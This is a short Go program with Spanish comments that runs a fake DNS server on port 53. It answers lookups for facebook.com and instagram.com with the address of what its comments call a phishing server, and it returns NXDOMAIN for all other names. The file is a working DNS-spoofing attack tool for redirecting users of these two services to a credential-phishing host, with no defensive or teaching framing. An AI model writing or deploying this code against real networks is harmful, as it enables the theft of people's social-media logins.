package main

import (
	"fmt"
	"log"
	"net"

	"github.com/miekg/dns"
)

// Lista de dominios que queremos redirigir
var spoofedDomains = map[string]string{
	"facebook.com.":  "192.168.1.100", // IP del servidor de phishing
	"instagram.com.": "192.168.1.100",
}

func main() {
	// Configuración del servidor DNS falso
	dns.HandleFunc(".", handleDNSRequest) // Maneja todas las solicitudes
	server := &dns.Server{Addr: ":53", Net: "udp"}

	fmt.Println("Servidor DNS falso iniciado en :53")
	err := server.ListenAndServe()
	if err != nil {
		log.Fatalf("Error al iniciar el servidor DNS: %v", err)
	}
}

// handleDNSRequest maneja las solicitudes DNS entrantes
func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	for _, q := range r.Question {
		domain := q.Name
		spoofedIP, shouldSpoof := spoofedDomains[domain]
		if shouldSpoof {
			// Responde con la IP del servidor de phishing
			fmt.Printf("Redirigiendo %s a %s\n", domain, spoofedIP)
			m.Answer = append(m.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
				A:   net.ParseIP(spoofedIP),
			})
		} else {
			// Si el dominio no está en la lista, responde con NXDOMAIN
			m.Rcode = dns.RcodeNameError // Respuesta de dominio inexistente
		}
	}

	err := w.WriteMsg(m)
	if err != nil {
		log.Printf("Error al escribir el mensaje DNS: %v", err)
	}
}
